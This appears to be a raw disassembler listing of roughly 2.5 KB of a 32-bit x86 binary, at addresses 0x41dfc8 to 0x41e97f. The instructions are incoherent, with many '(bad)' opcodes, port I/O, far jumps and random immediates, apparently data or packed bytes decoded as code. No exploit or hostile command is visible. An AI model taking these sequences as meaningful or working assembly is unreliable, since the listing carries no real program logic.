  41dfc8:	add    DWORD PTR [ecx-0xa23f2eb],eax
  41dfce:	mov    ss,WORD PTR [ecx+0x5c14ed3e]
  41dfd4:	out    dx,al
  41dfd5:	outs   dx,DWORD PTR ds:[esi]
  41dfd6:	int3   
  41dfd7:	push   ds
  41dfd8:	sub    BYTE PTR [eax-0x4],ah
  41dfdb:	in     al,dx
  41dfdc:	lock cwde 
  41dfde:	int3   
  41dfdf:	pop    ebp
  41dfe0:	mov    edx,0x3ca48f56
  41dfe5:	mov    edi,DWORD PTR [eax+0x9]
  41dfe8:	jmp    0x25dca06
  41dfed:	test   al,0x12
  41dfef:	mov    ebp,0x8611f466
  41dff4:	sub    eax,0xe60794c
  41dff9:	outs   dx,DWORD PTR ds:[esi]
  41dffa:	std    
  41dffb:	mov    edx,0x52ad1406
  41e000:	mov    bl,0x23
  41e002:	push   0x489e67e6
  41e007:	sbb    BYTE PTR [ebx-0x614fc80d],dl
  41e00d:	mov    ah,0x5
  41e00f:	inc    esi
  41e010:	jns    0x41e05a
  41e012:	sar    DWORD PTR [edi],0xed
  41e015:	push   ss
  41e016:	mov    eax,ds:0x7d9f2a6c
  41e01b:	in     eax,dx
  41e01c:	xor    ch,BYTE PTR [eax-0x7d175849]
  41e022:	les    eax,FWORD PTR [ebx+0x33]
  41e025:	mov    WORD PTR [edx-0x72],?
  41e028:	(bad)  [edi]
  41e02a:	aaa    
  41e02b:	mov    al,BYTE PTR [esi+0x42036977]
  41e031:	inc    ebp
  41e032:	jae    0x41e080
  41e034:	dec    esp
  41e035:	pop    ebp
  41e036:	and    DWORD PTR [ecx+0x630e5e50],esp
  41e03c:	les    ebx,FWORD PTR [esp+ecx*2+0x31573312]
  41e043:	repnz clc 
  41e045:	fwait
  41e046:	jnp    0x41e01c
  41e048:	dec    edi
  41e049:	gs pop ss
  41e04b:	push   esi
  41e04c:	jbe    0x41dff6
  41e04e:	lock addr16 xchg edi,eax
  41e051:	xchg   ecx,eax
  41e052:	push   ss
  41e053:	ins    BYTE PTR es:[edi],dx
  41e054:	dec    ebx
  41e055:	mov    ebx,0xa5b108df
  41e05a:	push   ss
  41e05b:	add    al,0xfd
  41e05d:	jns    0x41e037
  41e05f:	jle    0x41e03f
  41e061:	fptan  
  41e063:	stc    
  41e064:	pop    ebp
  41e065:	and    BYTE PTR [ecx-0x1c],0x29
  41e069:	bound  edi,QWORD PTR [ebx]
  41e06b:	ins    DWORD PTR es:[edi],dx
  41e06c:	aam    0xf9
  41e06e:	inc    ebx
  41e06f:	mov    ebx,0x2429e58a
  41e074:	add    edi,DWORD PTR [ebp+0x38ffb1c5]
  41e07a:	call   DWORD PTR [edi+eiz*2-0x357db4ee]
  41e081:	push   ecx
  41e082:	lahf   
  41e083:	dec    eax
  41e084:	mov    eax,ds:0xf33f55ba
  41e089:	cmp    al,0x29
  41e08b:	mov    dl,0x31
  41e08d:	push   esp
  41e08e:	ins    DWORD PTR es:[edi],dx
  41e08f:	pop    ebx
  41e090:	mov    al,ds:0x0
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	dec    esi
  41e101:	pop    eax
  41e102:	mov    eax,ds:0x13ff887
  41e107:	add    BYTE PTR ds:0xf4000001,al
  41e10d:	iret   
  41e10e:	xchg   DWORD PTR [ecx],edx
  41e110:	or     ch,BYTE PTR [ecx-0x46]
  41e113:	push   esi
  41e114:	pop    ebx
  41e115:	add    edx,edi
  41e117:	mov    ah,0x7b
  41e119:	fadd   QWORD PTR [ebx]
  41e11b:	das    
  41e11c:	mov    ah,0x28
  41e11e:	dec    ecx
  41e11f:	dec    eax
  41e120:	je     0x41e177
  41e122:	cs cwde 
  41e124:	jo     0x41e0ba
  41e126:	push   edx
  41e127:	scas   eax,DWORD PTR es:[edi]
  41e128:	jmp    0x41e0ce
  41e12a:	and    dh,BYTE PTR [esi+0x1e]
  41e12d:	adc    DWORD PTR [eax+0x1319196],esi
  41e133:	push   0xa418b618
  41e138:	hlt    
  41e139:	rol    BYTE PTR [edi],1
  41e13b:	enter  0xe193,0x61
  41e13f:	pop    es
  41e140:	mov    ebx,0x72236f00
  41e145:	pop    eax
  41e146:	inc    esi
  41e147:	mov    esi,0x8a5be87
  41e14c:	lods   al,BYTE PTR ds:[esi]
  41e14d:	ins    BYTE PTR es:[edi],dx
  41e14e:	imul   edx,DWORD PTR [ecx-0x1],0xb8fc8ae8
  41e155:	sub    BYTE PTR [ebx+ebp*8-0x416f6dd6],ch
  41e15c:	cmp    bl,bh
  41e15e:	push   esi
  41e15f:	mov    al,0x76
  41e161:	push   0x1
  41e163:	ins    BYTE PTR es:[edi],dx
  41e164:	icebp  
  41e165:	mov    ds:0x3ef51581,eax
  41e16a:	xor    eax,0x429e3f19
  41e16f:	dec    eax
  41e170:	fidiv  DWORD PTR [edx]
  41e172:	xchg   DWORD PTR [edi],ebx
  41e174:	fbld   TBYTE PTR [ebx+ebx*4]
  41e177:	jl     0x41e1a0
  41e179:	jmp    0x53339d29
  41e17e:	call   0x8c7a:0x5535d62d
  41e185:	outs   dx,BYTE PTR ds:[esi]
  41e186:	push   edi
  41e187:	(bad)  
  41e188:	dec    DWORD PTR [ecx+0x3b1808dc]
  41e18e:	(bad)  
  41e18f:	retf   0x376a
  41e192:	mov    edi,0x56fff43
  41e197:	xchg   edi,eax
  41e198:	push   DWORD PTR [eax+0x30c0643c]
  41e19e:	push   ebp
  41e19f:	mov    dh,0xd1
  41e1a1:	fadd   st(1),st
  41e1a3:	inc    edx
  41e1a4:	lock adc al,0x40
  41e1a7:	bound  ebx,QWORD PTR [edx-0x36b11b49]
  41e1ad:	popf   
  41e1ae:	push   0xa03971cf
  41e1b3:	out    dx,al
  41e1b4:	ret    0x6792
  41e1b7:	inc    esp
  41e1b8:	push   edx
  41e1b9:	lahf   
  41e1ba:	int3   
  41e1bb:	imul   ebp,DWORD PTR [esp+eiz*4+0x69e5f4e4],0x3298c85a
  41e1c6:	cmp    dl,bl
  41e1c8:	pop    eax
  41e1c9:	(bad)  
  41e1ca:	mov    edi,0x42df02cf
  41e1cf:	nop
  41e1d0:	fcmove st,st(0)
  41e1d2:	arpl   WORD PTR [edi+ebx*8],di
  41e1d5:	xchg   edx,eax
  41e1d6:	in     al,0x4e
  41e1d8:	or     BYTE PTR [ecx],dl
  41e1da:	fs xchg ch,ah
  41e1dd:	mov    DWORD PTR [ecx-0x22],eax
  41e1e0:	mov    bl,0xfc
  41e1e2:	sbb    DWORD PTR [edi-0x2a023cd8],ecx
  41e1e8:	add    dl,BYTE PTR [esi+0x43]
  41e1eb:	jmp    0x72ce:0xa8f024f
  41e1f2:	inc    eax
  41e1f3:	sbb    DWORD PTR [eax],esi
  41e1f5:	pop    es
  41e1f6:	xchg   ecx,eax
  41e1f7:	adc    DWORD PTR cs:[esi+eax*2-0x303535dc],ebp
  41e1ff:	pop    ebx
  41e200:	dec    ebx
  41e201:	loopne 0x41e1c7
  41e203:	fcomp  QWORD PTR [edx]
  41e205:	mov    ecx,0xaeb2d992
  41e20a:	les    esp,FWORD PTR ds:[esi+0x38d82911]
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xc8
  41e281:	jp     0x41e235
  41e283:	outs   dx,DWORD PTR ds:[esi]
  41e284:	std    
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0xb9000001
  41e28d:	nop
  41e28e:	inc    edx
  41e28f:	xchg   edx,eax
  41e290:	cmp    bh,BYTE PTR [esp+eax*4-0x5a90135b]
  41e297:	ror    BYTE PTR [ecx],1
  41e299:	repz mov bl,0x5b
  41e29c:	and    BYTE PTR [edi-0x37f63e20],dl
  41e2a2:	call   0xd764:0xd965b94c
  41e2a9:	not    ebx
  41e2ab:	push   esi
  41e2ac:	push   ebx
  41e2ad:	loop   0x41e2f1
  41e2af:	neg    BYTE PTR [ebx-0x3a]
  41e2b2:	popa   
  41e2b3:	shl    esi,cl
  41e2b5:	fnstsw WORD PTR [edx]
  41e2b7:	aas    
  41e2b8:	pop    ebx
  41e2b9:	jmp    0x4128:0xc9fd1e5d
  41e2c0:	mov    bl,0xef
  41e2c2:	shl    DWORD PTR [edx+0x123ce1d3],1
  41e2c8:	xchg   DWORD PTR [ebx-0x1f81e4f9],eax
  41e2ce:	popf   
  41e2cf:	dec    edx
  41e2d0:	cmp    BYTE PTR [esi-0x6be8fb2f],dh
  41e2d6:	and    ah,BYTE PTR [eax-0x7a]
  41e2d9:	sbb    al,0xa4
  41e2db:	inc    DWORD PTR [ebx]
  41e2dd:	(bad)
  41e2e1:	push   ebx
  41e2e2:	sub    bh,BYTE PTR [esi]
  41e2e4:	xchg   edi,eax
  41e2e5:	mov    ah,bh
  41e2e7:	add    DWORD PTR [ecx-0x5bb30cc0],edx
  41e2ed:	stos   BYTE PTR es:[edi],al
  41e2ee:	pop    ebp
  41e2ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2f0:	jbe    0x41e30f
  41e2f2:	jl     0x41e2b9
  41e2f4:	or     bl,al
  41e2f6:	add    ebx,DWORD PTR [edx+eax*4-0x356ff4b8]
  41e2fd:	fbstp  TBYTE PTR [ebx+edx*8+0x9]
  41e301:	icebp  
  41e302:	jge    0x41e31b
  41e304:	loopne 0x41e34c
  41e306:	or     cl,BYTE PTR [eax-0x3f]
  41e309:	in     eax,0xcd
  41e30b:	push   0x46
  41e30d:	mov    ecx,ds
  41e30f:	push   ss
  41e310:	(bad)  
  41e312:	ffreep st(4)
  41e314:	or     BYTE PTR [ebx],dl
  41e316:	add    eax,edi
  41e318:	mov    cl,0xaf
  41e31a:	ficomp DWORD PTR [ebx-0x7e]
  41e31d:	pushf  
  41e31e:	and    bh,cl
  41e320:	xor    dl,BYTE PTR [ebx-0xf]
  41e323:	and    BYTE PTR [eax+0x3897d50a],ch
  41e329:	jne    0x41e33c
  41e32b:	out    0x6b,eax
  41e32d:	jp     0x41e39b
  41e32f:	callw  0x4b6b
  41e333:	pop    es
  41e334:	dec    ecx
  41e335:	dec    eax
  41e336:	or     al,0x6f
  41e338:	and    DWORD PTR [ebx-0x6c],0x31
  41e33c:	sbb    DWORD PTR [edx+0x68],0x71
  41e340:	je     0x41e335
  41e342:	aas    
  41e343:	inc    edx
  41e344:	or     DWORD PTR [eax+0x58],edi
  41e347:	shrd   DWORD PTR [eax-0x62],esi,cl
  41e34b:	(bad)  
  41e34c:	push   ecx
  41e34d:	jle    0x41e322
  41e34f:	mov    eax,ds:0xc2a902f2
  41e354:	aas    
  41e355:	xlat   BYTE PTR ds:[ebx]
  41e356:	pushf  
  41e357:	out    dx,al
  41e358:	mov    BYTE PTR [esi-0x3070b95d],ch
  41e35e:	fwait
  41e35f:	inc    esi
  41e360:	arpl   bp,sp
  41e362:	std    
  41e363:	pop    eax
  41e364:	in     al,dx
  41e365:	adc    esi,DWORD PTR [edi-0x7f696d6d]
  41e36b:	mov    ecx,0xbefbd733
  41e370:	fcmovnbe st,st(6)
  41e372:	jge    0x41e37b
  41e374:	(bad)  
  41e375:	or     BYTE PTR [ecx+ecx*4+0x498f22a5],dh
  41e37c:	outs   dx,DWORD PTR ds:[esi]
  41e37d:	lahf   
  41e37e:	mov    eax,ds:0x8319eff1
  41e383:	add    eax,DWORD PTR [ecx]
  41e385:	cli    
  41e386:	inc    edi
  41e387:	not    DWORD PTR [ecx+0x5247a22b]
  41e38d:	push   ebx
  41e38e:	ins    BYTE PTR es:[edi],dx
  41e38f:	ja     0x41e39f
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x29094209
  41e403:	scas   al,BYTE PTR es:[edi]
  41e404:	add    al,BYTE PTR [edx+0x1]
  41e407:	add    BYTE PTR ds:0x20000001,al
  41e40d:	cwde   
  41e40e:	dec    ecx
  41e40f:	retf   0xde73
  41e412:	(bad)  
  41e413:	push   0xffffffa4
  41e415:	ret    
  41e416:	gs ret 
  41e418:	mov    edx,0x7929e84f
  41e41d:	sbb    al,0xa6
  41e41f:	sub    cl,BYTE PTR [edx-0x249c26db]
  41e425:	sub    edx,ecx
  41e427:	adc    al,0xd1
  41e429:	adc    al,BYTE PTR [eax]
  41e42b:	push   edx
  41e42c:	cdq    
  41e42d:	sbb    sp,WORD PTR [esi-0x78]
  41e431:	xchg   ebp,eax
  41e432:	mov    cl,0xc6
  41e434:	cdq    
  41e435:	xor    eax,0xbb83be75
  41e43a:	sub    BYTE PTR ss:[ecx-0x5dad79dc],0xcd
  41e442:	cmp    BYTE PTR [esi],dh
  41e444:	xchg   ebp,eax
  41e445:	in     eax,dx
  41e446:	loope  0x41e428
  41e448:	mov    eax,0xc2dc9c2a
  41e44d:	rcr    BYTE PTR [ebx+0x362973ba],cl
  41e453:	loope  0x41e4d4
  41e455:	pop    eax
  41e456:	or     DWORD PTR [ebp+0xe],0xcec7936c
  41e45d:	clc    
  41e45e:	das    
  41e45f:	sbb    eax,0x9d40783b
  41e464:	add    BYTE PTR [ebx+0x0],0x6
  41e468:	push   eax
  41e469:	cli    
  41e46a:	enter  0x6fc8,0xdf
  41e46e:	jg     0x41e405
  41e470:	push   edx
  41e471:	xchg   DWORD PTR [edx+0x66249473],ecx
  41e477:	push   ecx
  41e478:	cdq    
  41e479:	mov    ds:0x1d81d7c7,eax
  41e47e:	sar    bl,cl
  41e480:	pop    es
  41e481:	shl    DWORD PTR [eax],0xc
  41e484:	xlat   BYTE PTR ds:[ebx]
  41e485:	add    eax,0xdc4306bf
  41e48a:	std    
  41e48b:	in     eax,0xd3
  41e48d:	lahf   
  41e48e:	jbe    0x41e4fa
  41e490:	or     edx,DWORD PTR [ebx]
  41e492:	rol    DWORD PTR [esi-0x1c],cl
  41e495:	mov    ebp,0x7b07d2f9
  41e49a:	pop    ebx
  41e49b:	int3   
  41e49c:	rcl    cl,cl
  41e49e:	sub    eax,edi
  41e4a0:	or     BYTE PTR [edx+0x1b],al
  41e4a3:	ins    DWORD PTR es:[edi],dx
  41e4a4:	adc    DWORD PTR [esi+0x1d96e8a3],esi
  41e4aa:	inc    ecx
  41e4ab:	out    0x68,al
  41e4ad:	or     DWORD PTR [esi+0x1e8025b8],ecx
  41e4b3:	pop    ebx
  41e4b4:	int3   
  41e4b5:	push   0xffffffee
  41e4b7:	sub    al,0xe4
  41e4b9:	div    ecx
  41e4bb:	adc    bh,bl
  41e4bd:	pop    ss
  41e4be:	mov    al,ds:0x5f0b1961
  41e4c3:	xor    al,0xa8
  41e4c5:	lahf   
  41e4c6:	sbb    al,0x4d
  41e4c8:	in     eax,0xe8
  41e4ca:	cmovg  ecx,edx
  41e4cd:	adc    eax,0x2d89d8e1
  41e4d2:	push   ss
  41e4d3:	loope  0x41e4b8
  41e4d5:	out    dx,eax
  41e4d6:	sbb    esi,edi
  41e4d8:	xor    DWORD PTR [edi],edx
  41e4da:	sub    BYTE PTR [ecx-0x33fea6a8],cl
  41e4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4e1:	jns    0x41e4cb
  41e4e3:	push   ebx
  41e4e4:	cmp    eax,0xa270e75e
  41e4e9:	cmc    
  41e4ea:	and    dl,cl
  41e4ec:	(bad)  
  41e4ed:	inc    esp
  41e4ef:	jae    0x41e4f8
  41e4f1:	orps   xmm3,XMMWORD PTR [eax-0x7c]
  41e4f5:	(bad)  
  41e4f6:	out    dx,eax
  41e4f7:	addr16 mov eax,0x2d333f0d
  41e4fd:	mov    ds:0xe58c9d31,al
  41e502:	ss int3 
  41e504:	and    esi,ebx
  41e506:	test   al,0x23
  41e508:	dec    ebx
  41e509:	std    
  41e50a:	shl    eax,0xa1
  41e50d:	test   BYTE PTR [eax+0xfd45],0x0
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e576
  41e581:	ds addr16 dec ecx
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0x5c000001
  41e58d:	cmp    eax,0xfcd05bbd
  41e592:	outs   dx,BYTE PTR ds:[esi]
  41e593:	pop    ds
  41e594:	fistp  DWORD PTR [eax]
  41e596:	outs   dx,DWORD PTR ds:[esi]
  41e597:	mov    dh,0x43
  41e599:	mov    ecx,DWORD PTR [ecx]
  41e59b:	lods   al,BYTE PTR ds:[esi]
  41e59c:	mov    al,0xd3
  41e59e:	and    cl,BYTE PTR [ebx]
  41e5a0:	pop    esp
  41e5a1:	out    0x5c,al
  41e5a3:	es and eax,0x219fce6e
  41e5a9:	and    al,0x2f
  41e5ab:	cli    
  41e5ac:	inc    eax
  41e5ad:	shl    BYTE PTR [esi],cl
  41e5af:	xchg   ecx,eax
  41e5b0:	adc    eax,0xe89cd9d7
  41e5b5:	xlat   BYTE PTR ds:[ebx]
  41e5b6:	sbb    eax,0x37029d55
  41e5bb:	xor    ecx,esp
  41e5bd:	pusha  
  41e5be:	out    0x81,al
  41e5c0:	in     eax,dx
  41e5c1:	inc    esi
  41e5c2:	in     al,dx
  41e5c3:	into   
  41e5c4:	mov    ds:0xc393d707,al
  41e5c9:	int    0x41
  41e5cb:	xor    esp,ebp
  41e5cd:	(bad)  
  41e5ce:	jbe    0x41e596
  41e5d0:	in     al,0xad
  41e5d2:	popf   
  41e5d3:	add    eax,0x268783cf
  41e5d8:	cmp    ah,BYTE PTR [ecx-0x66]
  41e5db:	push   ebp
  41e5dc:	(bad)
  41e5df:	ins    BYTE PTR es:[edi],dx
  41e5e0:	retf   0x6636
  41e5e3:	fwait
  41e5e4:	stos   BYTE PTR es:[edi],al
  41e5e5:	and    BYTE PTR [eax-0x3e25188f],0x31
  41e5ec:	fsubr  QWORD PTR [ebp+0x6]
  41e5ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5f0:	mov    ecx,0x20610720
  41e5f5:	retf   
  41e5f6:	sub    al,0x67
  41e5f8:	jecxz  0x41e5b4
  41e5fa:	fxch   st(4)
  41e5fc:	xor    ebp,DWORD PTR [eax-0x8]
  41e5ff:	sub    dh,BYTE PTR [ecx+0x73]
  41e602:	adc    DWORD PTR [ebx+eiz*8-0x7c],ecx
  41e606:	lock jp 0x41e60c
  41e609:	jae    0x41e5ba
  41e60b:	inc    esp
  41e60c:	ins    BYTE PTR es:[edi],dx
  41e60d:	scas   al,BYTE PTR es:[edi]
  41e60e:	sbb    bh,al
  41e610:	or     ecx,DWORD PTR [eax-0x69]
  41e613:	mov    ?,WORD PTR [esi-0x4c]
  41e616:	xor    esp,edx
  41e618:	out    0xf0,al
  41e61a:	or     al,0xf7
  41e61c:	dec    ebp
  41e61d:	push   es
  41e61e:	mov    al,0x5c
  41e620:	push   0xd36e4cbd
  41e625:	loop   0x41e5e5
  41e627:	cmp    al,0x90
  41e629:	mov    bh,0x54
  41e62b:	in     eax,dx
  41e62c:	pop    ebp
  41e62d:	(bad)  
  41e62e:	in     al,0x63
  41e630:	test   DWORD PTR [edx],edx
  41e632:	add    eax,0x5e23e0ae
  41e637:	jbe    0x41e64b
  41e639:	aaa    
  41e63a:	inc    ebp
  41e63b:	lods   al,BYTE PTR ds:[esi]
  41e63c:	out    0x32,eax
  41e63e:	or     al,0x2d
  41e640:	std    
  41e641:	(bad)  
  41e642:	retf   
  41e643:	jg     0x41e602
  41e645:	lods   eax,DWORD PTR ds:[esi]
  41e646:	or     al,0x42
  41e648:	pop    edx
  41e649:	cmp    DWORD PTR [ebp+0x7a836337],edi
  41e64f:	mov    ch,0x15
  41e651:	or     BYTE PTR [edx-0x695eaa32],cl
  41e657:	jge    0x41e652
  41e659:	sbb    DWORD PTR ds:[ebx-0x2a2f3322],edx
  41e660:	div    esi
  41e662:	mov    eax,ds:0x37585c9d
  41e667:	xor    al,0x90
  41e669:	lea    edx,[eax-0x26a74ebb]
  41e66f:	or     eax,0x1bce5d1e
  41e674:	icebp  
  41e675:	outs   dx,DWORD PTR ds:[esi]
  41e676:	fmul   st(5),st
  41e678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e679:	div    DWORD PTR [esi+0x5de59248]
  41e67f:	out    0x69,al
  41e681:	inc    esp
  41e682:	push   ebx
  41e683:	mov    cl,0xee
  41e685:	push   cs
  41e686:	jnp    0x41e621
  41e688:	mov    WORD PTR [esi-0x9],fs
  41e68b:	and    dh,BYTE PTR ds:0x7f748bba
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    eax,DWORD PTR ds:0xcaffdf6
  41e705:	inc    esp
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0xf0000001
  41e70d:	mov    ah,BYTE PTR [edx-0x1cd03fe0]
  41e713:	leave  
  41e714:	mov    ebx,0xf09954b7
  41e719:	add    BYTE PTR [ecx],ch
  41e71b:	adc    eax,0x7a90806f
  41e720:	adc    bh,BYTE PTR [edx]
  41e722:	push   es
  41e723:	push   DWORD PTR [esi]
  41e725:	mov    edi,0x8c737328
  41e72a:	aas    
  41e72b:	mov    es:0xa87f34fc,eax
  41e731:	xor    eax,0xd7f2616a
  41e736:	shl    BYTE PTR [edi],cl
  41e738:	mov    eax,0x4abf2683
  41e73d:	and    BYTE PTR [edx+0x1638906e],al
  41e743:	retf   
  41e744:	mov    cl,0xa2
  41e746:	push   ss
  41e747:	push   esp
  41e748:	xchg   esi,eax
  41e749:	or     ecx,DWORD PTR ds:0x21a080a1
  41e74f:	mov    dh,0xd6
  41e751:	pop    es
  41e752:	ins    DWORD PTR es:[edi],dx
  41e753:	retf   0xf81
  41e756:	(bad)  
  41e758:	mov    cl,0xa
  41e75a:	daa    
  41e75b:	pop    ebx
  41e75c:	adc    BYTE PTR [esp+esi*2],0xb5
  41e760:	aad    0xcf
  41e762:	ds inc esp
  41e764:	mov    al,0xc8
  41e766:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e768:	loopne 0x41e767
  41e76a:	mov    DWORD PTR [eax+0x6],edi
  41e76d:	inc    ebp
  41e76e:	out    0xb3,eax
  41e770:	mul    BYTE PTR [bp+di+0x78]
  41e774:	or     esi,ecx
  41e776:	inc    esi
  41e777:	inc    edi
  41e778:	js     0x41e75a
  41e77a:	inc    eax
  41e77b:	fistp  DWORD PTR [ebp-0x55]
  41e77e:	aaa    
  41e77f:	loop   0x41e731
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	inc    edi
  41e783:	jg     0x41e76d
  41e785:	arpl   bp,dx
  41e787:	test   DWORD PTR fs:[esp+eax*2],edx
  41e78b:	jne    0x41e7b0
  41e78d:	mov    edx,0x5bb1ae2a
  41e792:	inc    esp
  41e793:	cmp    DWORD PTR [edx+0x17],0x29d461a1
  41e79a:	not    DWORD PTR [edx-0x30acda0b]
  41e7a0:	aas    
  41e7a1:	mov    eax,?
  41e7a3:	jne    0x41e7e2
  41e7a5:	iret   
  41e7a6:	out    0x12,eax
  41e7a8:	add    BYTE PTR [eax-0x71],cl
  41e7ab:	sbb    ebp,DWORD PTR [ebp+0x11]
  41e7ae:	add    edi,DWORD PTR [edx-0x24f54507]
  41e7b4:	pop    es
  41e7b5:	xor    eax,DWORD PTR [ebp+0x2c69a38a]
  41e7bb:	pinsrw mm0,WORD PTR [ebx],0xdd
  41e7bf:	mov    bl,0x66
  41e7c1:	ror    ebp,cl
  41e7c3:	popa   
  41e7c4:	jp     0x41e74a
  41e7c6:	add    ah,dl
  41e7c8:	jmp    0xca0b:0x95512190
  41e7cf:	mov    al,0x5d
  41e7d1:	mov    edi,0x54331bc8
  41e7d6:	aam    0xc1
  41e7d8:	xchg   ecx,eax
  41e7d9:	jle    0x41e845
  41e7db:	aas    
  41e7dc:	outs   dx,BYTE PTR ds:[esi]
  41e7dd:	loopne 0x41e7a3
  41e7df:	and    al,0x85
  41e7e1:	in     al,dx
  41e7e2:	add    esi,eax
  41e7e4:	(bad)  
  41e7e5:	into   
  41e7e6:	jg     0x41e78f
  41e7e8:	pusha  
  41e7e9:	sahf   
  41e7ea:	push   eax
  41e7eb:	inc    esp
  41e7ec:	push   cs
  41e7ed:	pop    esi
  41e7ee:	xchg   esp,eax
  41e7ef:	pusha  
  41e7f0:	lds    ebp,FWORD PTR ss:[eax-0x119a891e]
  41e7f7:	fs bound esp,QWORD PTR es:[eax+0x7b]
  41e7fc:	aaa    
  41e7fd:	jmp    0x8439:0xffc97d47
  41e804:	inc    edi
  41e805:	xor    ecx,edi
  41e807:	xor    ebx,DWORD PTR [edx]
  41e809:	fstp   TBYTE PTR [eax+eax*1-0x76]
  41e80d:	push   0xf9f2ca
	...
  41e872:	add    BYTE PTR [eax],al
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e855
  41e881:	sub    ebx,0xffffffd2
  41e884:	adc    DWORD PTR [ebp+0x1],eax
  41e887:	add    BYTE PTR ds:0x11000001,al
  41e88d:	mov    dh,0x2f
  41e88f:	ror    DWORD PTR [edx-0x74bf5b68],1
  41e895:	cmp    eax,0xd121f982
  41e89a:	stos   DWORD PTR es:[edi],eax
  41e89b:	jno    0x41e860
  41e89d:	(bad)  
  41e89e:	cmp    al,0xd8
  41e8a0:	shl    esp,1
  41e8a2:	inc    edx
  41e8a3:	repz int3 
  41e8a5:	mov    ebx,0x5a27fd4d
  41e8aa:	or     BYTE PTR [edi],ah
  41e8ac:	mov    ebx,0xc9cba0dd
  41e8b1:	inc    ebp
  41e8b2:	xchg   ebx,eax
  41e8b3:	into   
  41e8b4:	mov    dl,0x5f
  41e8b6:	cmp    DWORD PTR [ecx-0x3],esp
  41e8b9:	xchg   ebx,eax
  41e8ba:	push   cs
  41e8bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8bc:	jecxz  0x41e854
  41e8be:	mov    WORD PTR [edx-0x51],gs
  41e8c1:	retf   0xb684
  41e8c4:	adc    eax,0x3eeb5b74
  41e8c9:	lods   eax,DWORD PTR ds:[esi]
  41e8ca:	adc    DWORD PTR [eax-0x28],edi
  41e8cd:	cmc    
  41e8ce:	or     eax,0xb0a20875
  41e8d3:	fisttp WORD PTR [eax+eax*2-0x67982de8]
  41e8da:	sbb    BYTE PTR [esi-0x13],0x19
  41e8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8df:	daa    
  41e8e0:	(bad)  
  41e8e1:	fidiv  DWORD PTR [ebp-0x6f339cd2]
  41e8e7:	test   ah,ah
  41e8e9:	pop    esp
  41e8ea:	xchg   ecx,eax
  41e8eb:	add    BYTE PTR [esi+0x4efaa3ef],0x2b
  41e8f2:	or     al,0x67
  41e8f4:	push   ss
  41e8f5:	mov    ebp,0xa6442016
  41e8fa:	add    edx,DWORD PTR [ebx+0x78]
  41e8fd:	inc    ebx
  41e8fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ff:	cmp    eax,0xcc2b0967
  41e904:	ret    
  41e905:	aam    0xa7
  41e907:	push   eax
  41e908:	and    eax,0xee731631
  41e90d:	das    
  41e90e:	add    BYTE PTR [esi],0xd0
  41e911:	popf   
  41e912:	call   DWORD PTR [ebp-0xa]
  41e915:	jmp    0x6078:0x1fc2c1f2
  41e91c:	xchg   ebx,eax
  41e91d:	test   BYTE PTR [ebx+0x2e578eb2],bh
  41e923:	push   ebp
  41e924:	jnp    0x41e8a9
  41e926:	imul   eax,DWORD PTR [edi+0x2c],0x18
  41e92a:	inc    esp
  41e92b:	in     eax,0x14
  41e92d:	xchg   esi,eax
  41e92e:	mov    ebp,DWORD PTR [edx+0x1a9a3b47]
  41e934:	into   
  41e935:	sti    
  41e936:	and    BYTE PTR [eax-0x47],cl
  41e939:	xchg   ebx,eax
  41e93a:	cmp    edx,DWORD PTR [eax+0x1e]
  41e93d:	adc    al,0x37
  41e93f:	push   ecx
  41e940:	fucomip st,st(4)
  41e942:	fidiv  WORD PTR [ebx-0x2f]
  41e945:	aam    0x21
  41e947:	add    al,bl
  41e949:	mov    ebx,0x78f1837
  41e94e:	push   edi
  41e94f:	pusha  
  41e950:	jecxz  0x41e94a
  41e952:	lahf   
  41e953:	cmp    eax,0xec87714f
  41e958:	popa   
  41e959:	cli    
  41e95a:	inc    edx
  41e95b:	add    dl,0x85
  41e95e:	rcl    BYTE PTR [ebx],1
  41e960:	(bad)  
  41e961:	mulps  xmm1,xmm1
  41e964:	int    0xab
  41e966:	cmp    eax,0x404ef9d9
  41e96b:	shr    dh,0x38
  41e96e:	stc    
  41e96f:	ja     0x41e91b
  41e971:	xchg   edx,eax
  41e972:	mov    BYTE PTR [eax-0x1544a6b5],0x17
  41e979:	push   esi
  41e97a:	adc    al,0x47
  41e97c:	(bad)  
  41e97d:	xor    al,BYTE PTR [edx]
  41e97f:	mov    DWORD PTR [eax],ecx
